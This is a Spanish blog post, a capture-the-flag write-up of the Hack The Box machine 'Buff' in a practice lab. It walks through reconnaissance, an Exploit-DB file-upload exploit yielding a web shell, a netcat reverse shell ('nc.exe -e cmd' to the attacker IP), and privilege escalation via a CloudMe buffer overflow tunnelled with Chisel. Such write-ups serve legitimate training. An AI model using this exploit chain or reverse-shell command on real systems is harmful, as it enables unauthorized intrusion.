---
layout: single
title: Writeup HTB - Maquina Buff
comments: true
excerpt: "Hola a todos hace poco la maquina Buff se retiró. Por lo tanto, escribo este writeup para compartirles como pude resolver esta máquina tan divertida."
date: 2020-11-26
classes: wide
header:
  teaser: /assets/images/writeup-maquina-htb-buff/Screenshot_1.jpg
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP
  - HackTheBox
  - Hacking
---

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_1.jpg">
</p>

Hola a todos hace poco la maquina Buff se retiró. Por lo tanto, escribo este writeup para compartirles como pude resolver esta máquina tan divertida.

Comenzamos, primero haremos un escaneo con nmap a todos los puertos

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_2.jpg">
</p>

Vemos que solo nos arroja los puertos abiertos 7680, 8080. Asi que corramos con nmap para ver la versión de los servicios 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_3.jpg">
</p>

Lo más interesante que vemos es el puerto 8080, así que veámoslo en el navegador 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_4.jpg">
</p>

Vemos que hay una aplicación web, entonces se me ocurre pasarle un whatweb para ver que tecnologías usa

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_5.jpg">
</p>

Esto nos sirve para confirmar lo que nos dice nmap y saber que usa PHP. Ahora usemos Gobuster para un scaneo de directorios

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_6.jpg">
</p>

Lo mas interesante fue /upload.php

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_7.jpg">
</p>

Sin embargo, me salía esto, así que empecé a revisar la web y encontré el nombre de la aplicación

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_8.jpg">
</p>

Así que se me ocurrió buscar un exploit en exploit-db

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_9.jpg">
</p>

Revisemos el exploit para ver como usarlo 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_10.jpg">
</p>

Vemos que usarlo no es complicado solo Poner

```bash
Python 48506.py http://10.10.10.198:8080/
```

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_11.jpg">
</p>

Como vemos nos genera una Shell no tan buena porque no nos deja trabajar cómodamente. La explicación es sencilla lo que pasa que este exploit nos sube un archivo con doble extensión kamehameha.php.png para hacer el bypass y que no es nada menos que nuestra Shell y le hace consultas por GET todos los comandos que hagamos y lo imprime en consola.

```bash
http://10.10.10.198:8080/upload/kamehameha.php?telepathy=comando
```

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_12.jpg">
</p>

Por eso haremos una Shell más cómoda para eso necesitamos subir al servidor nuestro nc.exe con impacket-smbserver

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_13.jpg">
</p>

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_14.jpg">
</p>

Dejamos en escucha el puerto 4445

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_15.jpg">
</p>

Ejecutamos nc.exe de esta manera nc.exe -e cmd 10.10.14.75 4445 para conectarnos a nuestra ip para generar nuestra Shell 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_16.jpg">
</p>

Ahora a buscar nuestra flag de user con exito

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_17.jpg">
</p>

Si intentamos entrar la carpeta de Administrador para buscar la flag nos sale Acess is Denied

## Escalamiento de Privilegios

Llegamos aquí en la parte mas interesante en escalar privilegios con permisos de admin, revisando las carpetas Downloads vemos que hay un ejecutable CloudMe_1112.exe, Tengamos presente esto

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_18.jpg">
</p>

Revisemos los procesos abiertos con el comando: Tasklist

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_19.jpg">
</p>

Vaya vaya, veamos los puertos en escucha con el comando: netstat -ano 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_20.jpg">
</p>

Revisando con powershell que proceso está usando los puertos en especial el puerto 8888, verificamos que el Proceso CloudMe está usando el puerto 8888

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_21.jpg">
</p>

Así que me puse a buscar un exploit para CloudMe y existe uno que hace un buffer overflow, Lamentablemente este puerto está en escucha internamente y no podemos acceder a ella me imagino por un firewall

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_22.jpg">
</p>

Entonces no nos queda mas que hacer Port Forwarding, redirigir el trafico del puerto 8888 a nuestro 127.0.0.1:8888 para poder atacar localmente a la maquina victima con nuestro exploit. Por lo tanto tendremos que usar Chisel 

<center><a href='https://github.com/jpillora/chisel/releases/tag/v1.7.2'>https://github.com/jpillora/chisel/releases/tag/v1.7.2'</a></center><br>

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_23.jpg">
</p>

Para esta maquina yo descargare chisel_1.7.2_windows_386.gz y chisel_1.7.2_linux_amd64.gz y las descomprimiré, para luego de nuevo subir a chisel.exe

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_24.jpg">
</p>

Ya desde nuestra maquina ejecuto el ejecutable en Linux con el siguiente comando con el puerto 9001

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_25.jpg">
</p>

Y en la maquina victima ponemos el siguiente comando con nuestra ip y nuestro puerto 9001 que dejamos en escucha 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_26.jpg">
</p>

Ya que creamos el túnel con éxito , ahora debemos generar el payload para agregarlo a nuestro exploit 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_27.jpg">
</p>

La única modificación que haremos es reemplazar el payload en el exploit

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_28.jpg">
</p>

Ahora dejamos en escucha el puerto 4486 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_29.jpg">
</p>

Y corremos nuestro exploit y bum Shell creada con permisos de administrador 😉 .  Ahora busquemos nuestro Flag 

<p align="center">
<img src="/assets/images/writeup-maquina-htb-buff/Screenshot_29.jpg">
</p>

Espero que le haya gustado el WriteUp, como a mí me gusto escribirla. Aprovecho para saludad a Angussmoody y Nextco por el apoyo con esta maquina.